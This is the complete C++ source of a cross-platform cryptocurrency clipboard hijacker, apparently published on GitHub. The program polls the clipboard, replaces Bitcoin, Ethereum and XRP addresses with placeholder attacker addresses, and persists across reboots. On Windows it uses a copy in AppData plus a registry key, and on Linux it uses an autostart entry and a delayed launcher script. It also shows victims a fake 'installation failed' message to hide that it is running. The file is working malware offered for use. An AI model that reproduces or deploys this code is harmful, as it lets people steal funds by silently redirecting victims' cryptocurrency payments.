// C++lippy
// Made with <3 by Balzabu
// https://github.com/Balzabu/
// https://balzabu.io

#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include <regex>
#include <unordered_map>
#include <filesystem>
#include <fstream>

#ifdef _WIN32
#include <windows.h>
#include <ShlObj.h>
#else
#include <unistd.h>
#include <pwd.h>
#endif

namespace fs = std::filesystem;

// Forward declaration
void CheckClipboard();

#ifdef _WIN32
// Flag to track if the MessageBox is shown
bool isMessageBoxShown = false;

// Forward declarations for Windows-specific functions
bool IsInstalledOnWindows();
void InstallOnWindows();
#endif

// Function to check and modify clipboard content
void CheckClipboard() {

    // Define a mapping between cryptocurrency addresses and default values
    std::unordered_map<std::string, std::string> addressDefaults = {
        {"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}$", "BTC_ADDRESS"},
        {"^0x[a-fA-F0-9]{40}$", "ETH_ADDRESS"},
        {"r[0-9a-zA-Z]{24,34}$", "XRP_ADDRESS"}
    };

#ifdef _WIN32
    // Windows clipboard handling
    if (OpenClipboard(NULL)) {
        HANDLE hData = GetClipboardData(CF_TEXT);
        if (hData != NULL) {
            char* pszText = static_cast<char*>(GlobalLock(hData));
            if (pszText != NULL) {
                // Check if the clipboard content matches any of ourregexes
                std::string clipboardContent(pszText);

                for (const auto& entry : addressDefaults) {
                    // Check if the clipboard content matches any of our crypto regexes
                    if (std::regex_match(clipboardContent, std::regex(entry.first))) {
                        // Match, modify the clipboard content with the associated default value
                        EmptyClipboard();
                        HGLOBAL hNewData = GlobalAlloc(GMEM_MOVEABLE, entry.second.size() + 1);
                        if (hNewData != NULL) {
                            char* pszNewText = static_cast<char*>(GlobalLock(hNewData));
                            if (pszNewText != NULL) {
                                strcpy(pszNewText, entry.second.c_str());
                                GlobalUnlock(hNewData);
                                SetClipboardData(CF_TEXT, hNewData);
                            }
                        }
                        break; // Stop checking after the first match
                    }
                }
                GlobalUnlock(hData);
            }
        }
        CloseClipboard();
    }
#else
    // Linux clipboard handling using xclip
    FILE* pipe = popen("xclip -o -selection clipboard | tr -d '\n'", "r");
    if (pipe != nullptr) {
        char buffer[256];
        std::string clipboardContent;
        while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
            clipboardContent += buffer;
        }
        pclose(pipe);

        // Check if the clipboard content matches any of our crypto regexes
        for (const auto& entry : addressDefaults) {
            if (std::regex_match(clipboardContent, std::regex(entry.first))) {
                // Match, modify the clipboard content with the associated default value
                std::string command = "echo -n '" + entry.second + "' | xclip -selection clipboard";
                std::system(command.c_str());
                break; // Stop checking after the first match
            }
        }
    }
#endif
}

#ifdef _WIN32
    // Function to check if the application is already installed on Windows
    bool IsInstalledOnWindows() {
        // Check if the application is already installed on Windows by checking for a Registry Key
        char exePath[MAX_PATH];
        GetModuleFileName(NULL, exePath, MAX_PATH);

        HKEY hKey;
        LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\YourAppName", 0, KEY_READ, &hKey);
        RegCloseKey(hKey);

        // Convert paths to strings before comparison
        std::string appDataPath;
        PWSTR appData;
        if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &appData))) {
            appDataPath = fs::path(appData).string() + "\\YourAppName";
            CoTaskMemFree(appData);
        } else {
            std::cerr << "Error getting Roaming AppData folder path." << std::endl;
            return false;
        }

        return (result == ERROR_SUCCESS) && (appDataPath == fs::path(exePath).parent_path().string());
    }

    // Windows installation function
    void InstallOnWindows() {
        // Check if the application is already installed
        if (IsInstalledOnWindows()) {
            std::cout << "Application is already installed on Windows." << std::endl;
            return;
        }

        // Set a flag indicating that the application has been installed
        isMessageBoxShown = true;

        // Get the path to the currently running executable
        char exePath[MAX_PATH];
        GetModuleFileName(NULL, exePath, MAX_PATH);

        // Get the Roaming AppData folder path
        PWSTR appData;
        if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &appData))) {
            std::filesystem::path appDataPath(appData);
            CoTaskMemFree(appData);

            // Create the target directory in %APPDATA%
            appDataPath /= "YourAppName";  // Append the app name to the Roaming AppData path
            if (!fs::create_directory(appDataPath)) {
                std::cerr << "Error creating installation directory: " << appDataPath << std::endl;
                return;
            }

            // Create a new copy of the application in %APPDATA%
            std::string targetPath = (appDataPath / "YourAppName.exe").string();
            if (!fs::copy_file(exePath, targetPath, fs::copy_options::overwrite_existing)) {
                std::cerr << "Error copying executable to: " << targetPath << std::endl;
                return;
            }

            // Create the registry key
            HKEY hKey;
            LONG result = RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\YourAppName", 0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL);
            if (result == ERROR_SUCCESS) {
                RegCloseKey(hKey);
            } else {
                std::cerr << "Error creating registry key." << std::endl;
                return;
            }

            std::cout << "Application installed successfully on Windows." << std::endl;

            // Spawn a thread to display MessageBox
            // Print a fake message about the installation failing :)
            std::thread([&]() {
                MessageBoxA(NULL, "Installation failed, your system is not supported.", "Installation Failed", MB_OK | MB_ICONERROR);
            }).detach();
        } else {
            std::cerr << "Error getting Roaming AppData folder path." << std::endl;
        }
    }
#else

    // Forward declaration with an argument
    void InstallOnLinux(const std::string& executableName);

    // Create the execute.sh script
    void CreateExecuteScript(const std::string& executablePath) {
        // Specify the path for the execute.sh script
        std::string executeScriptPath = "/usr/local/bin/execute.sh";

        // Create the execute.sh script content
        std::string executeScriptContent =
            "#!/bin/sh\n"
            "sleep 120\n" +
            executablePath + "&\n";

        // Write the execute.sh script
        std::ofstream executeScriptFile(executeScriptPath);
        executeScriptFile << executeScriptContent;
        executeScriptFile.close();

        // Set execute permissions for the execute.sh script
        std::string chmodExecuteScriptCommand = "chmod +x " + executeScriptPath;
        std::system(chmodExecuteScriptCommand.c_str());
    }

    // Linux installation function
    void InstallOnLinux(const std::string& executableName) {
        // Check if the application is running with root permissions
        if (geteuid() != 0) {
            std::cerr << "Error: This application requires root (superuser) permissions to install.\n";
            exit(EXIT_FAILURE);  // Terminate the application with a failure code
        }

        // Get the path to the currently running executable
        std::string executablePath = fs::read_symlink("/proc/self/exe");

        // Quote paths to handle special characters
        std::string quotedExecutablePath = "\"" + executablePath + "\"";
        std::string quotedExecutableName = "\"" + executableName + "\"";

        // Copy the executable to /usr/local/bin
        std::error_code copyError;
        std::string copyCommand = "sudo cp " + quotedExecutablePath + " \"/usr/local/bin/" + executableName + "\"";
        std::system(copyCommand.c_str());

        if (copyError) {
            // Handle error...
            return;
        }

        // Set executable permissions
        std::error_code chmodError;
        std::string chmodCommand = "sudo chmod +x \"/usr/local/bin/" + executableName + "\"";
        std::system(chmodCommand.c_str());

        if (chmodError) {
            // Handle error...
            return;
        }

        // Determine the original user's home directory
        const char* sudoUser = getenv("SUDO_USER");
        if (sudoUser == nullptr) {
            std::cerr << "Error: Could not determine the original user.\n";
            exit(EXIT_FAILURE);
        }

        struct passwd *pw = getpwnam(sudoUser);
        const char* homeDir = pw ? pw->pw_dir : nullptr;

        if (homeDir == nullptr) {
            std::cerr << "Error: Could not determine the original user's home directory.\n";
            exit(EXIT_FAILURE);
        }

        // Create the .desktop file content
        std::string desktopFileContent =
            "[Desktop Entry]\n"
            "Type=Application\n"
            "Name=Your App Name\n"
            "Exec=/usr/local/bin/execute.sh\n"  // Point to execute.sh script
            "Terminal=false\n"
            "StartupNotify=false\n";

        // Specify the path for the .desktop file in the original user's home directory
        std::string desktopFilePath = fs::path(homeDir) / ".config/autostart/YourAppName.desktop";

        // Write the .desktop file
        std::ofstream desktopFile(desktopFilePath);
        desktopFile << desktopFileContent;
        desktopFile.close();

        // Set permissions for the .desktop file
        std::string chmodDesktopCommand = "chmod +x " + desktopFilePath;
        std::system(chmodDesktopCommand.c_str());

        // Create the execute.sh script
        CreateExecuteScript("/usr/local/bin/" + executableName);

        // Print a message for debugging
        std::cout << "Installation completed successfully!" << std::endl;

        // Execute the script directly
        std::string executeScriptCommand = "/usr/local/bin/execute.sh&";
        std::system(executeScriptCommand.c_str());

        exit(EXIT_FAILURE);
    }
#endif

#ifdef _WIN32
    int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
        // Check if the application is already installed on Windows
        if (!IsInstalledOnWindows()) {
            InstallOnWindows();
        }

        while (true) {
            // Application code...

            // Sleep for a period
            std::this_thread::sleep_for(std::chrono::seconds(1));

            // Check and modify clipboard content
            CheckClipboard();
        }

        return 0;
    }

#else
    int main() {
        // Get the path to the currently running executable
        std::string executablePath = fs::read_symlink("/proc/self/exe");

        // Extract the executable name from the path
        std::string executableName = fs::path(executablePath).filename();

        // Specify the path for the .desktop file
        std::string desktopFilePath = fs::path(getenv("HOME")) / ".config/autostart/YourAppName.desktop";

        // Check if the .desktop file exists
        if (!fs::exists(desktopFilePath)) {
            // The .desktop file does not exist, trigger the installation process
            InstallOnLinux(executableName);
        }

        while (true) {
            // Application code...

            // Sleep for a period
            std::this_thread::sleep_for(std::chrono::seconds(1));

            // Check and modify clipboard content
            CheckClipboard();
        }

        return 0;
    }
#endif
